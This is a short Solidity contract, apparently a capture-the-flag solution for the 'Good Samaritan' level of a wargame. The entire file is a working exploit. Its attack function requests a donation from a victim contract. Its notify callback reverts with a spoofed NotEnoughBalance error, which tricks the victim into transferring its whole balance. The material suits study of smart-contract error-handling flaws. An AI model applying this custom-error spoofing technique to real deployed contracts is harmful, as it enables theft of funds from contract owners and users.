// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./GoodSamaritan.sol";

contract GoodSamaritanHack {
    GoodSamaritan public gdsamaritan;

    error NotEnoughBalance();

    function attack(address victim) external {
        gdsamaritan = GoodSamaritan(victim);
        gdsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
